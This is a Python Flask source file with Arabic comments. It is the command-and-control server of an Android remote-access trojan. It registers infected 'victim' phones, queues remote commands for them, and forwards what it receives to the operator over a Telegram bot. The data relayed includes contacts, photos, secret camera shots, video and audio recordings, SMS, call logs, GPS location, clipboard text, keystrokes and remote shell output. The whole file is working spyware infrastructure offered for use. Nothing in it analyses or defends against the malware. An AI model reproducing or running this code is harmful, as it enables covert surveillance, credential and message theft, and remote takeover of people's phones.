# api_victim.py
# ============================================================
# API للضحية (Victim APK) — v7
# يستخدم HTML بدل Markdown لتجنب أخطاء الرموز
# ============================================================

import io
import base64
import time
import threading
import html
import traceback
from flask import request, jsonify

from config import bot, redis_client
from imports_manager import (
    find_victim_by_token,
    register_victim_device,
    update_victim_status,
    pop_victim_commands,
    has_victim_commands,
)

from logging_config import get_logger
from monitoring import metrics

logger = get_logger("api_victim")


def h(text):
    """★ Escape HTML"""
    if text is None:
        return ""
    return html.escape(str(text))


# ============================================================
# ★★★ Buffers ★★★
# ============================================================
class VictimBuffer:
    def __init__(self, victim_id, chat_id, victim_name):
        self.victim_id = victim_id
        self.chat_id = chat_id
        self.victim_name = victim_name
        self.contacts = []
        self.contacts_total = 0
        self.photos = []
        self.photos_total = 0
        self.lock = threading.Lock()


_buffers = {}
_buffers_lock = threading.Lock()


def _get_buffer(victim_id, chat_id, victim_name):
    with _buffers_lock:
        if victim_id not in _buffers:
            _buffers[victim_id] = VictimBuffer(victim_id, chat_id, victim_name)
        buf = _buffers[victim_id]
        buf.chat_id = chat_id
        buf.victim_name = victim_name
        return buf


def _cleanup_buffer(victim_id):
    """تنظيف buffer بعد الاستخدام"""
    with _buffers_lock:
        _buffers.pop(victim_id, None)


def _send_contacts_batch(victim_id):
    with _buffers_lock:
        buf = _buffers.get(victim_id)
        if not buf or not buf.contacts:
            return
        contacts = list(buf.contacts)
        total = buf.contacts_total or len(contacts)
        buf.contacts = []

    try:
        cid = int(buf.chat_id) if str(buf.chat_id).isdigit() else buf.chat_id

        lines = [
            f"📇 <b>جهات الاتصال</b> — {h(buf.victim_name)}",
            f"━━━━━━━━━━━━━━━━━━",
            f"📊 <b>العدد:</b> {len(contacts)} / {total}",
            "",
        ]

        for i, c in enumerate(contacts, 1):
            name = h(c.get("name") or "—")
            number = h(c.get("number") or "—")
            lines.append(f"<b>{i}.</b> {name}")
            lines.append(f"   📞 <code>{number}</code>")
            lines.append("")

        content = "\n".join(lines)

        if len(content) > 3000:
            buf_io = io.BytesIO(content.encode('utf-8'))
            buf_io.name = f"contacts_{len(contacts)}.txt"
            bot.send_document(
                cid, buf_io,
                caption=f"📇 <b>جهات الاتصال ({len(contacts)}/{total})</b>",
                parse_mode="HTML"
            )
        else:
            bot.send_message(cid, content, parse_mode="HTML")

        logger.info(f"Contacts batch sent: {len(contacts)}")
        metrics.inc_counter("victim_data_sent", tags={"type": "contacts"})

    except Exception as e:
        logger.exception(f"send contacts batch error: {e}")


def _send_photos_batch(victim_id):
    with _buffers_lock:
        buf = _buffers.get(victim_id)
        if not buf or not buf.photos:
            return
        photos = list(buf.photos)
        total = buf.photos_total or len(photos)
        buf.photos = []

    try:
        cid = int(buf.chat_id) if str(buf.chat_id).isdigit() else buf.chat_id

        if len(photos) <= 3:
            for i, (name, img_bytes) in enumerate(photos, 1):
                try:
                    buf_io = io.BytesIO(img_bytes)
                    buf_io.name = name
                    bot.send_photo(
                        cid, buf_io,
                        caption=f"🖼️ <b>{h(name)}</b> ({i}/{len(photos)})",
                        parse_mode="HTML"
                    )
                    time.sleep(0.5)
                except Exception as e:
                    logger.warning(f"photo {i} error: {e}")
        else:
            import zipfile
            zip_buffer = io.BytesIO()
            with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zf:
                for name, img_bytes in photos:
                    zf.writestr(name, img_bytes)

            zip_buffer.seek(0)
            zip_buffer.name = f"photos_{len(photos)}.zip"

            bot.send_document(
                cid, zip_buffer,
                caption=f"🖼️ <b>الصور ({len(photos)}/{total})</b>\n📦 ملف ZIP",
                parse_mode="HTML"
            )

        logger.info(f"Photos batch sent: {len(photos)}")
        metrics.inc_counter("victim_data_sent", tags={"type": "photos"})

    except Exception as e:
        logger.exception(f"send photos batch error: {e}")


# ============================================================
# API Init
# ============================================================
def init_victim_api(app, bot_instance=None):
    global bot
    if bot_instance:
        bot = bot_instance

    # ============================================================
    # Register
    # ============================================================
    @app.route('/apk/victim/register', methods=['POST'])
    def victim_register():
        try:
            data = request.get_json(silent=True) or {}
            victim_token = data.get('token', '').strip()

            if not victim_token:
                return jsonify({"error": "missing_token"}), 400

            victim_info = find_victim_by_token(victim_token)
            if not victim_info:
                metrics.inc_counter("victim_register_fail", tags={"reason": "invalid_token"})
                return jsonify({"error": "invalid_token"}), 403

            chat_id = victim_info['chat_id']
            victim_id = victim_info['victim_id']
            victim_name = victim_info.get('name', 'Unknown')

            device_id = data.get('device_id', '')
            model = data.get('model', 'Unknown')
            brand = data.get('brand', 'Unknown')
            android = data.get('android', 'Unknown')
            sdk = data.get('sdk', 0)

            register_victim_device(
                chat_id, victim_id, device_id,
                {"model": model, "brand": brand, "android": android, "sdk": sdk}
            )

            logger.info(f"Victim registered: {victim_name}")
            metrics.inc_counter("victim_registered")

            try:
                cid = int(chat_id) if str(chat_id).isdigit() else chat_id
                bot.send_message(
                    cid,
                    f"✅ <b>ضحية جديدة متصلة!</b>\n"
                    f"━━━━━━━━━━━━━━━━━━\n"
                    f"👤 <b>الاسم:</b> <code>{h(victim_name)}</code>\n"
                    f"📱 <b>الموديل:</b> <code>{h(brand)} {h(model)}</code>\n"
                    f"🤖 <b>Android:</b> <code>{h(android)}</code> (SDK {sdk})\n"
                    f"🆔 <b>Device:</b> <code>{h(device_id[:16])}</code>\n\n"
                    f"🎛️ استخدم /panel للتحكم",
                    parse_mode="HTML"
                )
            except Exception as e:
                logger.warning(f"notify error: {e}")

            return jsonify({"ok": True, "victim_id": victim_id}), 200

        except Exception as e:
            logger.exception(f"register error: {e}")
            return jsonify({"error": str(e)}), 500

    # ============================================================
    # Poll
    # ============================================================
    @app.route('/apk/victim/poll', methods=['GET'])
    def victim_poll():
        try:
            victim_token = request.args.get('token', '').strip()
            check_only = request.args.get('check', '') == '1'

            if not victim_token:
                return jsonify({"commands": [], "has": False}), 200

            victim_info = find_victim_by_token(victim_token)
            if not victim_info:
                return jsonify({"commands": [], "has": False}), 200

            victim_id = victim_info['victim_id']
            chat_id = victim_info['chat_id']

            if check_only:
                has = has_victim_commands(victim_id)
                return jsonify({"has": has}), 200

            try:
                update_victim_status(chat_id, victim_id, "active")
            except Exception as e:
                logger.warning(f"update_victim_status error: {e}")

            commands = pop_victim_commands(victim_id, max_count=10)
            metrics.inc_counter("victim_poll")
            return jsonify({"commands": commands, "has": len(commands) > 0}), 200

        except Exception as e:
            logger.exception(f"poll error: {e}")
            return jsonify({"commands": [], "has": False}), 200

    # ============================================================
    # Data
    # ============================================================
    @app.route('/apk/victim/data', methods=['POST'])
    def victim_data():
        try:
            data = request.get_json(silent=True) or {}
            victim_token = data.get('token', '').strip()
            dtype = data.get('type', '')

            if not victim_token:
                return jsonify({"status": "no_token"}), 200

            victim_info = find_victim_by_token(victim_token)
            if not victim_info:
                return jsonify({"status": "invalid_token"}), 200

            chat_id = victim_info['chat_id']
            victim_id = victim_info['victim_id']
            victim_name = victim_info.get('name', 'Unknown')
            cid = int(chat_id) if str(chat_id).isdigit() else chat_id

            logger.debug(f"[<<] {dtype} from {victim_name}")
            metrics.inc_counter("victim_data", tags={"type": dtype})

            # ============================================================
            # Camera
            # ============================================================
            if dtype == "camera_photo":
                img_data = data.get('image', '')
                cam_name = data.get('camera_name', '')
                cam_icon = "📷 أمامية" if cam_name == "front" else "📸 خلفية"

                if img_data and img_data.startswith("data:image"):
                    try:
                        _, encoded = img_data.split(",", 1)
                        img_bytes = base64.b64decode(encoded)
                        buf_io = io.BytesIO(img_bytes)
                        buf_io.name = f"camera_{cam_name}.jpg"
                        bot.send_photo(
                            cid, buf_io,
                            caption=f"📸 <b>{cam_icon}</b>\n👤 {h(victim_name)}",
                            parse_mode="HTML"
                        )
                    except Exception as e:
                        logger.warning(f"photo error: {e}")

            # ============================================================
            # Photo Single
            # ============================================================
            elif dtype == "photo_single":
                img_data = data.get("image", "")
                img_name = data.get("name", "photo.jpg")
                total = data.get("total", 1)

                if img_data and img_data.startswith("data:image"):
                    try:
                        _, encoded = img_data.split(",", 1)
                        img_bytes = base64.b64decode(encoded)

                        buf = _get_buffer(victim_id, cid, victim_name)
                        with buf.lock:
                            buf.photos.append((img_name, img_bytes))
                            buf.photos_total = total

                        if len(buf.photos) >= 3:
                            _send_photos_batch(victim_id)
                    except Exception as e:
                        logger.warning(f"photo_single error: {e}")

            elif dtype == "photos_done":
                total = data.get("total", 0)
                _send_photos_batch(victim_id)
                try:
                    bot.send_message(
                        cid,
                        f"✅ <b>تم استلام الصور</b> — {h(victim_name)}\n"
                        f"📊 الإجمالي: {total}",
                        parse_mode="HTML"
                    )
                except Exception as e:
                    logger.warning(f"photos_done notify error: {e}")

            # ============================================================
            # Contacts
            # ============================================================
            elif dtype == "contacts":
                contact = data.get("contact", None)
                total = data.get("total", 0)

                if contact:
                    buf = _get_buffer(victim_id, cid, victim_name)
                    with buf.lock:
                        buf.contacts.append(contact)
                        buf.contacts_total = total

                    if len(buf.contacts) >= 50:
                        _send_contacts_batch(victim_id)

            elif dtype == "contacts_done":
                total = data.get("total", 0)
                _send_contacts_batch(victim_id)
                try:
                    bot.send_message(
                        cid,
                        f"✅ <b>تم استلام جهات الاتصال</b> — {h(victim_name)}\n"
                        f"📊 الإجمالي: {total}",
                        parse_mode="HTML"
                    )
                except Exception as e:
                    logger.warning(f"contacts_done notify error: {e}")

            # ============================================================
            # Video
            # ============================================================
            elif dtype == "video_record":
                video_data = data.get('video', '')
                duration = data.get('duration', 0)
                if video_data and video_data.startswith("data:video"):
                    try:
                        _, encoded = video_data.split(",", 1)
                        vid_bytes = base64.b64decode(encoded)
                        buf_io = io.BytesIO(vid_bytes)
                        buf_io.name = "record.mp4"
                        bot.send_video(
                            cid, buf_io,
                            caption=f"🎥 <b>فيديو {duration/1000:.1f} ثانية</b>\n👤 {h(victim_name)}",
                            parse_mode="HTML"
                        )
                    except Exception as e:
                        logger.warning(f"video error: {e}")

            # ============================================================
            # Audio
            # ============================================================
            elif dtype == "audio_record":
                audio_data = data.get('audio', '')
                duration = data.get('duration', 0)
                if audio_data and audio_data.startswith("data:audio"):
                    try:
                        _, encoded = audio_data.split(",", 1)
                        aud_bytes = base64.b64decode(encoded)
                        buf_io = io.BytesIO(aud_bytes)
                        buf_io.name = "record.3gp"
                        bot.send_audio(
                            cid, buf_io,
                            caption=f"🎙️ <b>صوت {duration/1000:.1f} ثانية</b>\n👤 {h(victim_name)}",
                            parse_mode="HTML"
                        )
                    except Exception as e:
                        logger.warning(f"audio error: {e}")

            # ============================================================
            # Device Info
            # ============================================================
            elif dtype == "device_info":
                text = (
                    f"📱 <b>معلومات الجهاز</b>\n"
                    f"━━━━━━━━━━━━━━━━━━\n"
                    f"👤 <code>{h(victim_name)}</code>\n"
                    f"📦 الموديل: <code>{h(data.get('model'))}</code>\n"
                    f"🏭 الشركة: <code>{h(data.get('brand'))}</code>\n"
                    f"🤖 Android: <code>{h(data.get('android'))}</code>"
                )
                bot.send_message(cid, text, parse_mode="HTML")

            # ============================================================
            # Battery
            # ============================================================
            elif dtype == "battery":
                level = data.get('level', 0)
                charging = data.get('charging', False)
                text = (
                    f"🔋 <b>البطارية</b>\n"
                    f"👤 <code>{h(victim_name)}</code>\n"
                    f"📊 <b>{level}%</b>\n"
                    f"⚡ {'يشحن' if charging else 'لا يشحن'}"
                )
                bot.send_message(cid, text, parse_mode="HTML")

            # ============================================================
            # SMS
            # ============================================================
            elif dtype == "sms":
                sms_list = data.get("sms", [])
                if not sms_list:
                    bot.send_message(cid, f"📭 لا رسائل من {h(victim_name)}", parse_mode="HTML")
                else:
                    lines = [
                        f"📨 <b>SMS — {h(victim_name)}</b>",
                        "━━━━━━━━━━━━━━━━━━",
                        f"📊 العدد: <b>{len(sms_list)}</b>",
                        "",
                    ]
                    for s in sms_list[:50]:
                        lines.append(f"📩 من: <code>{h(s.get('from'))}</code>")
                        lines.append(f"   {h(s.get('body', '')[:200])}")
                        lines.append("")

                    msg = "\n".join(lines)

                    if len(msg) > 3000:
                        buf_io = io.BytesIO(msg.encode('utf-8'))
                        buf_io.name = "sms.txt"
                        bot.send_document(cid, buf_io, caption=f"📨 SMS ({len(sms_list)})", parse_mode="HTML")
                    else:
                        bot.send_message(cid, msg, parse_mode="HTML")

            # ============================================================
            # Calls
            # ============================================================
            elif dtype == "call_log":
                calls = data.get("calls", [])
                type_map = {"1": "📥", "2": "📤", "3": "❌"}
                lines = [
                    f"📞 <b>سجل المكالمات — {h(victim_name)}</b>",
                    "━━━━━━━━━━━━━━━━━━",
                    f"📊 العدد: <b>{len(calls)}</b>",
                    "",
                ]
                for c in calls[:50]:
                    t = type_map.get(str(c.get('type', '')), '❓')
                    lines.append(f"{t} <code>{h(c.get('number'))}</code> — {c.get('duration')}s")

                bot.send_message(cid, "\n".join(lines), parse_mode="HTML")

            # ============================================================
            # Apps
            # ============================================================
            elif dtype == "apps":
                apps = data.get("apps", [])
                lines = [
                    f"📲 <b>التطبيقات — {h(victim_name)}</b>",
                    "━━━━━━━━━━━━━━━━━━",
                    f"📊 العدد: <b>{len(apps)}</b>",
                    "",
                ]
                for a in apps[:100]:
                    lines.append(f"• {h(a.get('name'))}")

                msg = "\n".join(lines)

                if len(msg) > 3000:
                    buf_io = io.BytesIO(msg.encode('utf-8'))
                    buf_io.name = "apps.txt"
                    bot.send_document(cid, buf_io, caption="📲 التطبيقات", parse_mode="HTML")
                else:
                    bot.send_message(cid, msg, parse_mode="HTML")

            # ============================================================
            # Location
            # ============================================================
            elif dtype == "location":
                lat = data.get("lat")
                lng = data.get("lng")
                if lat and lng:
                    maps_url = f"https://maps.google.com/?q={lat},{lng}"
                    bot.send_message(
                        cid,
                        f"📍 <b>الموقع</b> — {h(victim_name)}\n"
                        f"<code>{lat}, {lng}</code>\n"
                        f'<a href="{maps_url}">🗺️ خرائط جوجل</a>',
                        parse_mode="HTML"
                    )
                else:
                    bot.send_message(cid, f"❌ لا يوجد موقع من {h(victim_name)}", parse_mode="HTML")

            # ============================================================
            # Clipboard
            # ============================================================
            elif dtype == "clipboard":
                text = data.get("text", "")
                if text:
                    bot.send_message(
                        cid,
                        f"📋 <b>الحافظة</b> — {h(victim_name)}\n"
                        f"<pre>{h(text[:500])}</pre>",
                        parse_mode="HTML"
                    )
                else:
                    bot.send_message(cid, f"📋 الحافظة فاضية — {h(victim_name)}", parse_mode="HTML")

            # ============================================================
            # Photos List
            # ============================================================
            elif dtype == "photos":
                photos = data.get("photos", [])
                lines = [f"🖼️ <b>الصور ({len(photos)})</b> — {h(victim_name)}"]
                for p in photos[:20]:
                    lines.append(f"• <code>{h(p.get('path'))}</code>")
                bot.send_message(cid, "\n".join(lines), parse_mode="HTML")

            # ============================================================
            # Shell
            # ============================================================
            elif dtype == "shell_result":
                cmd = data.get("command", "")
                output = data.get("output", "")
                bot.send_message(
                    cid,
                    f"💻 <b>Shell</b> — {h(victim_name)}\n"
                    f"<code>{h(cmd)}</code>\n"
                    f"<pre>{h(output[:2000])}</pre>",
                    parse_mode="HTML"
                )

            # ============================================================
            # Command Result
            # ============================================================
            elif dtype == "cmd_result":
                action = data.get("action", "")
                status = data.get("status", "")
                error = data.get("error", "")
                if status == "fail":
                    bot.send_message(
                        cid,
                        f"❌ <b>فشل أمر على {h(victim_name)}</b>\n"
                        f"الأمر: <code>{h(action)}</code>\n"
                        f"السبب: <code>{h(error[:200])}</code>",
                        parse_mode="HTML"
                    )

            # ============================================================
            # Keylog
            # ============================================================
            elif dtype == "keylog":
                text = data.get("text", "")
                if text.strip():
                    bot.send_message(
                        cid,
                        f"⌨️ <b>لوحة مفاتيح</b> — {h(victim_name)}\n"
                        f"<pre>{h(text[:500])}</pre>",
                        parse_mode="HTML"
                    )

            elif dtype == "heartbeat":
                pass

            return jsonify({"status": "ok"}), 200

        except Exception as e:
            logger.exception(f"victim_data error: {e}")
            return jsonify({"status": "error"}), 200
